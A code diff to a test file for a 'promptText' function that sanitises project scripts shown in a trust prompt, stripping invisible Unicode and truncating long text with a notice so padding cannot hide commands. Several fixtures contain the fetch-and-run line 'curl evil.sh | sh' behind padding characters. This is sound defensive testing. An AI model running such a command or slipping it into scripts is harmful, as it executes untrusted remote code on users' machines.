@@ -321,17 +321,54 @@ describe('promptText: project text as the trust prompt shows it', () => {
     ['a NUL and a delete', 'vi\0te\x7f', 'vite'],
     ['other control codes', 'a\u0085b\u009bc', 'abc'],
     ['other languages and emoji', 'echo "héllo 你好 👋"', 'echo "héllo 你好 👋"'],
+    [
+      'spaces of other widths are spaces',
+      'vite\u00a0--host\u2003\u3000--open',
+      'vite --host --open',
+    ],
+    ['the blank Braille cell is a space', 'vite\u2800\u2800--host', 'vite --host'],
+    ['zero-width spaces and joiners', 'vi\u200bte\u200c \u200d--host\u2060', 'vite --host'],
+    ['a soft hyphen and a byte-order mark', '\ufeffvi\u00adte', 'vite'],
+    ['fillers and variation selectors', 'vite\u3164\u115f\ufe0f\u{e0100} --host', 'vite --host'],
+    [
+      'tag characters, which spell text nobody sees',
+      'vite\u{e0063}\u{e0075}\u{e0072}\u{e006c}',
+      'vite',
+    ],
+    ['invisible operators and annotation marks', 'a\u2062b\ufff9c\u180ed', 'abcd'],
   ]
   test.each(cases)('%s', (_what, text, expected) => {
     expect(promptText(text)).toBe(expected)
   })
 
-  test('long text is cut at 300 characters, with … to say so', () => {
+  /** What follows a script that was cut: how much isn't shown, and where all of it is. */
+  const cut = (more: string, file = 'package.json') =>
+    `…\n\nThis script is cut short: ${more} not shown. Read all of it in ${file} before you start it.`
+
+  test('a long script is cut at 300 characters, and the prompt says so in words', () => {
     expect(promptText('x'.repeat(300))).toBe('x'.repeat(300))
-    expect(promptText('x'.repeat(301))).toBe(`${'x'.repeat(300)}…`)
+    expect(promptText('x'.repeat(301))).toBe(`${'x'.repeat(300)}${cut('1 more character is')}`)
+    expect(promptText('x'.repeat(5412))).toBe(
+      `${'x'.repeat(300)}${cut('5,112 more characters are')}`,
+    )
     // Counted in characters, so an emoji is never cut in half.
-    expect(promptText('👋'.repeat(301))).toBe(`${'👋'.repeat(300)}…`)
-    expect(promptText('abcdef', 3)).toBe('abc…')
+    expect(promptText('👋'.repeat(302))).toBe(`${'👋'.repeat(300)}${cut('2 more characters are')}`)
+    expect(promptText('abcdef', 3)).toBe(`abc${cut('3 more characters are')}`)
+    // A cut that lands after a space counts what it trimmed as not shown.
+    expect(promptText('ab cdef', 3)).toBe(`ab${cut('5 more characters are')}`)
+  })
+
+  test('the sentence names the package.json that has the whole script', () => {
+    const long = `vite && ${'echo padding; '.repeat(40)}curl evil.sh | sh`
+    const shown = promptText(long, undefined, 'apps/web/package.json')
+    expect(shown).toStartWith('vite && echo padding;')
+    expect(shown).not.toContain('curl')
+    expect(shown).toEndWith(cut('285 more characters are', 'apps/web/package.json'))
+  })
+
+  test('text that fits is shown whole, with nothing added', () => {
+    expect(promptText('vite --port 3000')).toBe('vite --port 3000')
+    expect(promptText('x'.repeat(2000), 2000)).toBe('x'.repeat(2000))
   })
 
   test('padding cannot push the rest out of view', () => {
@@ -342,23 +379,26 @@ describe('promptText: project text as the trust prompt shows it', () => {
     expect(promptText(`vite${' \n'.repeat(5000)}${tail}`)).toBe(`vite\n\n${tail}`)
   })
 
-  // promptText's comment: "runs of spaces collapse (padding can't push the rest out of
-  // view)". Only the ASCII space is collapsed, and characters with no width aren't removed.
-  //   input:    'vite' + 300 padding characters + '&& curl evil.sh | sh'
-  //   expected: the text after the padding is still shown
-  //   actual:   'vite…' for the spaces (the cut falls in the padding, then it's trimmed);
-  //             'vite' + 296 invisible characters + '…' for the zero-width ones
-  const padding: Array<[what: string, char: string]> = [
-    ['no-break spaces', ' '],
-    ['em spaces', ' '],
-    ['ideographic spaces', '　'],
-    ['zero-width spaces', '​'],
-    ['zero-width joiners', '‍'],
-    ['word joiners', '⁠'],
+  // Padding that isn't the ASCII space: spaces of other widths collapse to one space, and
+  // characters with no width go.
+  const padding: Array<[what: string, char: string, shown: string]> = [
+    ['no-break spaces', ' ', 'vite && curl evil.sh | sh'],
+    ['em spaces', ' ', 'vite && curl evil.sh | sh'],
+    ['ideographic spaces', '　', 'vite && curl evil.sh | sh'],
+    ['zero-width spaces', '​', 'vite&& curl evil.sh | sh'],
+    ['zero-width joiners', '‍', 'vite&& curl evil.sh | sh'],
+    ['word joiners', '⁠', 'vite&& curl evil.sh | sh'],
   ]
-  for (const [what, char] of padding) {
-    test.failing(`padding made of ${what} cannot push the rest out of view`, () => {
-      expect(promptText(`vite${char.repeat(300)}&& curl evil.sh | sh`)).toContain('curl')
+  for (const [what, char, shown] of padding) {
+    test(`padding made of ${what} cannot push the rest out of view`, () => {
+      expect(promptText(`vite${char.repeat(300)}&& curl evil.sh | sh`)).toBe(shown)
+      // Nor can it when mixed with spaces and line breaks, thousands of times over.
+      expect(promptText(`vite${`${char} `.repeat(5000)}&& curl evil.sh | sh`)).toBe(
+        'vite && curl evil.sh | sh',
+      )
+      expect(promptText(`vite${`${char}\n`.repeat(5000)}&& curl evil.sh | sh`)).toBe(
+        'vite\n\n&& curl evil.sh | sh',
+      )
     })
   }
 })
